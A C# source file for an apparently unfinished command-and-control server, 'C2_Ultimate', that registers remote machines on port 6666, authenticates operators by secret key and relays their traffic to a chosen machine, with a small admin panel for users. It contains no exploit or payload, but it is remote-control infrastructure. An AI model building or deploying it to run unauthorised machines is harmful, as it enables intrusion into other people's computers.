using C2_Ultimate.clasess;
using Newtonsoft.Json;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics.CodeAnalysis;
using C2_Ultimate.DBContext;
using Microsoft.EntityFrameworkCore;
using C2_Ultimate.Models;

class Server
{
    private static TcpListener listener;
    private static readonly int port = 6666;
    private static List<RemotePC> remotePCs = new List<RemotePC>();

    static void Main(string[] args)
    {
            listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($"Server listening on port {port}...");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("Client connected!");
                Task.Run(() => HandleClient(client));
            }  
    }

    static string ReceiveCommand(NetworkStream stream)
    {
        byte[] buffer = new byte[8192];
        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        return Encoding.UTF8.GetString(buffer, 0, bytesRead);
    }

    static void SendResponse(NetworkStream stream, string response)
    {
        byte[] responseBytes = Encoding.UTF8.GetBytes(response);
        stream.Write(responseBytes, 0, responseBytes.Length);
        stream.Flush();
    }

    private static void HandleClient(TcpClient client)
    {
        NetworkStream stream = client.GetStream();
        try
        {
            string response = ReceiveCommand(stream);
            var systemInfo = JsonConvert.DeserializeObject<SystemInfo>(response);
            bool clientOrServer;
            if (systemInfo != null)
            {
                if (systemInfo.Type == "client")
                {
                    clientOrServer = true;
                }
                else
                {
                    clientOrServer = false;
                    remotePCs.Add(new RemotePC(client, clientOrServer, systemInfo, stream, systemInfo.SecretKeys));
                    Task.Run(()=> { ServerStreamChecker(remotePCs.Last()); });
                }

                if (clientOrServer)
                {
                    ClientWorker(stream, systemInfo.SecretKey);
                }
            }
            Console.WriteLine($"Received system info from {systemInfo.Type}:\n{JsonConvert.SerializeObject(systemInfo, Formatting.Indented)}");
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error in HandleClient: {e.Message}");
        }
    }

    static void ClientWorker(NetworkStream stream, string clientSecret)
    {
        
        try
        {
            RemotePC selectedPC = null;
            List<RemotePC> PCs = new List<RemotePC>();
            User currentUser = null;
            bool isAdmin = false;
            using (var context = new AppDbContext())
            {
                currentUser = context.Users.Select(x => x).Where(x => x.SecretKey == clientSecret).FirstOrDefault();
                if (currentUser == null)
                {
                    SendResponse(stream, "Access denied");
                    Console.WriteLine("Access denied");
                    return;
                }
            }
            if (currentUser.isAdmin)
            {
                PCs = remotePCs;
                Console.WriteLine("Welcome Admin: " + currentUser.Name);
                SendResponse(stream, "Welcome Admin " + currentUser.Name);
                isAdmin = true;
            }
            else
            {
                Console.WriteLine("Welcome " + currentUser.Name);
                SendResponse(stream, "Welcome " + currentUser.Name);
            }
            if (PCs.Count == 0 ) 
            {
                PCs = remotePCs.Where(x =>
                {
                    if (currentUser.isAdmin)
                    {
                        return true;
                    }
                    foreach (string item in x.secretKeys)
                    {
                        if (item == clientSecret)
                        {
                            return true;
                        }
                    }
                    return false;
                }
                ).ToList();
            }
            if (PCs.Count == 0&&!currentUser.isAdmin)
            {
                SendResponse(stream, "Sorry, but now you don't have PCs online");
                stream.Close();
            }
            else
            {
                string PCsToSelect = "Select PC\n";
                for (int i = 0; i < PCs.Count; i++)
                {
                    PCsToSelect += $"{i}. {PCs[i].info.MachineName}\n";
                }
                SendResponse(stream, PCsToSelect);
                string command = ReceiveCommand(stream);
                if (int.TryParse(command, out int PC_Num) && PC_Num >= 0 && PC_Num < PCs.Count)
                {
                    // Forward traffic between client and selected remote PC
                    selectedPC = PCs[PC_Num];
                    Task.Run(() => ForwardTraffic(stream, selectedPC));
                    SendResponse(stream, "Succsessfuly connected to: " + selectedPC.info.MachineName);
                }
                else
                {
                    if (currentUser.isAdmin)
                    {
                        if (command != null && command == currentUser.Password)
                        {
                            SendResponse(stream, "Wellcome to C2 Server Admin Panel\n1. Add new client\n2. Remove client\n3. Edit client data\n0. Exit");
                            SysAdminPanelService(stream,clientSecret);
                        }
                        else
                        {
                            SendResponse(stream, "Incorrect password");
                            ClientWorker(stream, clientSecret);
                        }
                    }
                    else
                    {
                        SendResponse(stream, "Incorrect select");
                        ClientWorker(stream, clientSecret);
                    }
                   
                }
                
                
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"Error in ClientWorker: {e.Message}");
        }
    }
    static void SysAdminPanelService(NetworkStream stream,string secretKey)
    {
        while (true)
        {
            string command = ReceiveCommand(stream);
            switch (command)
            {
                case "1": AddNewClient(stream,secretKey); break;
                case "2":RemoveClient(stream,secretKey); break;
                default:
                    break;
            }
        }
        
    }

    private static void RemoveClient(NetworkStream stream, string secretKey)
    {
        using (var context = new AppDbContext())
        {
            User currentUser = context.Users.Select(x => x).Where(x => x.SecretKey == secretKey).FirstOrDefault();
            if (currentUser != null && currentUser.isAdmin)
            {
                string allClients = "Select client for remove\n";
                int i = 1;
                foreach (var item in context.Users)
                {
                    allClients +=$"{i}. {item}\n";
                    i++;
                }
                allClients += "0. Cancel option";
                SendResponse(stream,allClients);
                string selectedClient = ReceiveCommand(stream);
                int slctClient = int.Parse(selectedClient);
                if (slctClient == 0)
                {
                    SendResponse(stream, "Option canceled");
                    return;
                }
                User clientForRemove=new User();
                i = 1;
                foreach (var item in context.Users)
                {
                    if (i == slctClient)
                    {
                        clientForRemove= item;
                        break;
                    }
                    i++;
                }
                string removedClientName=clientForRemove.Name;
                context.Users.Remove(clientForRemove);
                context.SaveChanges();
                SendResponse(stream, "Succsessfuly deleted client: " + removedClientName);

            }
            else
            {
                SendResponse(stream, "You dont have permissions");
            }
        }
    }

    static void AddNewClient(NetworkStream stream, string secretKey)
    {
        using (var context = new AppDbContext())
        {
            User currentUser = context.Users.Select(x => x).Where(x => x.SecretKey == secretKey).FirstOrDefault();
            if (currentUser!=null&&currentUser.isAdmin)
            {
                string response = ReceiveCommand(stream);
                var newUser = JsonConvert.DeserializeObject<User>(response);
                if (newUser != null)
                {

                    context.Users.Add(newUser);
                    context.SaveChanges();
                    Console.WriteLine("New user added");
                    Console.WriteLine(newUser.ToString());
                    SendResponse(stream, $"New user by name{newUser.Name} succsessfuly added");

                }
                else
                {
                    SendResponse(stream, "New user is null");
                }
            }
            else
            {
                SendResponse(stream, "You dont have permissions");
            }
            
        }
        //НАДО ДОПИСАТЬ ФУНКЦИОНАЛ ОСТВАЛЬНИХ ФУНКЦИЙ
        //ТАК ЖЕ НА КЛИЕНТЕ СДЕЛАТЬ КОМАНДУ PASS ПРИ ВИБОРЕ PC И ВВОД ПАРОЛЯ
        //ТАК ЖЕ СДЕЛАТЬ ФУНКЦИОНАЛ ДОБАВЛЕНИЯ ЮЗЕРА И ВИСИЛКУ НА СЕРВЕР И ДРУГИЕ КОМАНДИ
    }
    static void ForwardTraffic(NetworkStream clientStream, RemotePC remotePC)
    {
        var clientToServerTask = ForwardStream(clientStream, remotePC.stream);
        var serverToClientTask = ForwardStream(remotePC.stream, clientStream);

        Task.WhenAny(clientToServerTask, serverToClientTask).ContinueWith(_ =>
        {
            // Close both streams when one of the streams ends
            clientStream.Close();
            remotePC.stream.Close();
            if (IsNetworkStreamClosed(remotePC.stream))
            {
                lock (remotePCs)
                {
                    remotePCs.Remove(remotePC);
                    Console.WriteLine($"Remote PC {remotePC.info.MachineName} removed from the list.");
                }
            }
        });
    }

    static async Task ForwardStream(NetworkStream fromStream, NetworkStream toStream)
    {
        Console.WriteLine("Start forwarding");
        byte[] buffer = new byte[8192];
        int bytesRead;
        try
        {
            while ((bytesRead = await fromStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await toStream.WriteAsync(buffer, 0, bytesRead);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error forwarding traffic: {ex.Message}");
        }
        Console.WriteLine("End forwarding");
    }
    private static bool IsNetworkStreamClosed(NetworkStream stream)
    {
        try
        {
            if (stream == null || !stream.CanRead)
                return true;

            // Проверка на закрытие путем попытки отправить 0 байт
            var socket = ((System.Net.Sockets.NetworkStream)stream).Socket;
            return socket.Poll(1000, SelectMode.SelectRead) && (socket.Available == 0);
        }
        catch (Exception)
        {
            return true; // В случае ошибки, считать что поток закрыт
        }
    }
    static  void ServerStreamChecker(RemotePC remotePC)
    {
        while (true)
        {
            if (remotePC != null)
            {
                Console.WriteLine("Check servers connections for: "+remotePC.info.MachineName);
                
                    if (IsNetworkStreamClosed(remotePC.stream))
                    {
                        Console.WriteLine($"Remote PC {remotePC.info.MachineName} removed from the list.");
                        remotePCs.Remove(remotePC);
                        return;
                    }
            }
            Random r = new Random();
            Thread.Sleep(r.Next(1000, 10000));
        }
        
    }
}
